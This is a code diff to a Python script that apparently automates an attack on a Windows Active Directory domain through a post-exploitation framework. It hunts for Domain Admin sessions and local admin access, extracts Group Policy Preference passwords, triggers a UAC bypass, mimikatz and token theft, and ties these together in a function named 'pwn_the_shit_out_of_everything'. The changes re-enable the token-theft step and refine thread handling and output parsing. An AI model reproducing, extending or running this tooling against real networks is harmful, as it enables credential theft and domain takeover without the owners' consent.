@@ -7,7 +7,7 @@ import sys
 import re
 from time import sleep
 from requests import ConnectionError
-#from IPython import embed
+from IPython import embed
 
 #The following disables the InsecureRequests warning and the 'Starting new HTTPS connection' log message
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
@@ -196,8 +196,10 @@ def get_domain_controller(agent_name):
 
     return dcs
 
-def user_hunter(agent_name, group_name='"Domain Admins"', no_ping=False):
-    module_options = {'GroupName': group_name}
+def user_hunter(agent_name, group_name='"Domain Admins"', threads=5, no_ping=False):
+    module_options = {'GroupName': group_name,
+                      'Threads'  : str(int(threads))}
+
     if no_ping:
         module_options['NoPing'] = str(bool(no_ping))
 
@@ -224,10 +226,10 @@ def user_hunter(agent_name, group_name='"Domain Admins"', no_ping=False):
 
     return admin_sessions
 
-def find_localadmin_access(agent_name, threads=None, no_ping=False, computer_name=''):
+def find_localadmin_access(agent_name, threads=5, no_ping=False, computer_name=''):
     module_options = {'ComputerName': computer_name}
     if threads:
-      module_options['Threads'] = int(threads)
+      module_options['Threads'] = str(int(threads))
     if no_ping:
       module_options['NoPing'] = str(bool(no_ping))
 
@@ -278,6 +280,7 @@ def tokens(agent_name):
 def gpp(agent_name):
     results = execute_module_with_results('powershell/privesc/gpp', agent_name)
     results = results.split('\r\n\r\n')
+    
     gpps = []
     for result in results:
         entries = result.split('\r\n')
@@ -302,11 +305,17 @@ def gpp(agent_name):
                     passwords[-1] = passwords[-1][:-1]
 
             if entry.startswith('File'):
+                file_index = entries.index(entry)
                 file = entry.split(':')[1].strip()
+                for remainder in entries[file_index+1:]:
+                    file += remainder.strip()
 
         if file is not None and (usernames and passwords):
             gpp['file'] = file
             gpp['guid'] = file.split('\\')[6][1:-1]
+            if not len(gpp['guid']) == 36:
+                raise
+
             gpp['creds'] = dict(zip(usernames, passwords))
             gpps.append(gpp)
 
@@ -342,7 +351,6 @@ def tasklist(agent_name, process=None, username=None):
 
     results = run_shell_command_with_results(agent_name, command)
     results = results.split('\r\n')[2:]
-
     processes = []
 
     for entry in results:
@@ -358,14 +366,18 @@ def tasklist(agent_name, process=None, username=None):
         if len(entry[pid_index:]) == 5:
             pid, arch, user, _,_ = entry[pid_index:]
             name = ' '.join(entry[:pid_index])
+        elif not pid_index and len(entry) == 1 and not entry[0].isdigit():
+            processes[-1]['username'] = processes[-1]['username'] + entry[0]
         else:
             print(entry)
             raise
 
         if username and username == user:
-            processes.append({'name': name, 'pid': pid, 'arch': arch, 'username': user})
+            if not list(filter(lambda proc: proc['pid'] == pid, processes)):
+                processes.append({'name': name, 'pid': pid, 'arch': arch, 'username': user})
         else:
-            processes.append({'name': name, 'pid': pid, 'arch': arch, 'username': user})
+            if not list(filter(lambda proc: proc['pid'] == pid, processes)):
+                processes.append({'name': name, 'pid': pid, 'arch': arch, 'username': user})
 
     print('[+] Agent: {} => Enumerated {} processes'.format(agent_name, len(processes)))
 
@@ -434,7 +446,7 @@ def recon(agent_name):
             if session['hostname'] not in priority_targets:
                 priority_targets.append(session['hostname'])
 
-        del recon_threads[agent_name]
+    del recon_threads[agent_name]
 
 def elevate(agent_name):
     bypassuac_eventvwr(agent_name)
@@ -467,6 +479,8 @@ def privesc(agent_name):
 
         tried_domain_privesc = True
 
+    del privesc_threads[agent_name]
+
 def pwn_the_shit_out_of_everything(agent_name):
     '''
     This is the function that takes care of the logic for each agent thread
@@ -490,7 +504,7 @@ def pwn_the_shit_out_of_everything(agent_name):
         privesc_threads[agent_name].start()
 
     if agents[agent_name]['high_integrity']:
-        #tokens(agent_name)
+        tokens(agent_name)
 
         if agents[agent_name]['os'].lower().find('windows 7') != -1:
             mimikatz_thread = KThread(target=mimikatz, args=(agent_name,))
